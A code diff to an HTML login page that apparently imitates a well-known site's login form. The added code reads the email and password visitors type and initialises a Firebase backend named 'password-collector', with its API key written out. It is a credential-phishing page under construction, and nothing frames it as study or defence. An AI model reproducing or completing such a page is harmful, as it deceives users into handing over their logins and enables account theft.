@@ -7,9 +7,9 @@
       <td class="row1">Password</td>
     </tr>
     <tr>
-      <td><input type="text" class="inputtext">
+      <td><input type="text" class="inputtext" id="email">
       </td>
-      <td><input type="text" class="inputtext">
+      <td><input type="text" class="inputtext" id="password">
       </td>
       <td><input type="button" id="button" value = "Log In" onclick="clickEvent();" /></td>
     </tr>
@@ -115,6 +115,20 @@
 
 <script type = "text/javascript">
   function clickEvent() {
-      alert ('test!');
+      alert (document.getElementById("email").value + " " + document.getElementById("password").value);
   }
+</script>
+
+<script src="https://www.gstatic.com/firebasejs/5.8.0/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyAoEBK0XGWmv8XYx61pYnvWw0eN9BDhHa0",
+    authDomain: "password-collector.firebaseapp.com",
+    databaseURL: "https://password-collector.firebaseio.com",
+    projectId: "password-collector",
+    storageBucket: "password-collector.appspot.com",
+    messagingSenderId: "383676004049"
+  };
+  firebase.initializeApp(config);
 </script>
